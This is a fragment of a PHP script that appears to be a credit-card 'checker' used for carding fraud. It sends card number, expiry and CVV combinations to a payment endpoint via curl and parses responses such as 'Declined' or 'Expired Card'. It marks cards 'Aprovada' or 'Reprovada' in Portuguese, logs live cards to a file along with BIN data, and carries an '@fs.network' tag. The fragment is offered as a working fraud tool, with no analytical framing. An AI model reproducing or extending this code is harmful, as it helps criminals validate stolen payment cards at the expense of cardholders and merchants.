echo "</span> <span class='badge badge-success'>✔ Aprovada</span> <span class='badge badge-secondary'> ".$cc."|".$mes."|".$ano."|".$cvv."</span> <span class='badge badge-dark'> ".$info_bin."</span><span class='badge badge-warning'>Retorno:</span> ➔ </span><span class='badge badge-warning'> re-enter</span> ➔</span><span class='badge badge-dark'>@fs.network</span><br>";
saveGG("APROVADA ➜ $card_info ➜ $info_bin ➜ PLEASE RETRY\n");
usleep(100000);
curl_close($curl);
unlink($cookie);

}elseif (strpos($response, 'Expired Card') !== false) {
echo "</span> <span class='badge badge-success'>✔ Aprovada</span> <span class='badge badge-secondary'> ".$cc."|".$mes."|".$ano."|".$cvv."</span> <span class='badge badge-dark'> ".$info_bin."</span><span class='badge badge-warning'>Retorno:</span> ➔ </span><span class='badge badge-warning'> expire_date_incorrect</span> ➔</span><span class='badge badge-dark'>@fs.network</span><br>";
saveGG("APROVADA ➜ $card_info ➜ $info_bin ➜ EXPIRED CARD\n");
usleep(100000);
curl_close($curl);
unlink($cookie);

}elseif (strpos($response, 'Declined') !== false) {
    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$info_bin.' </span> <span class="badge badge-info"> Retorno: declined_generic_card</span></span>';
usleep(100000);
curl_close($curl);
unlink($cookie);
    
}elseif (strpos($response, 'INVALID CARD INFO') !== false ) {
    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$info_bin.' </span> <span class="badge badge-info"> Retorno: invalid_card_luhn</span></span>';
usleep(100000);
curl_close($curl);
unlink($cookie);

}else{
    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$bin_info.' </span> <span class="badge badge-info"> RETORNO: Erro não identificado.</span></span>';
usleep(100000);
curl_close($curl);
unlink($cookie);

}


}
}



?>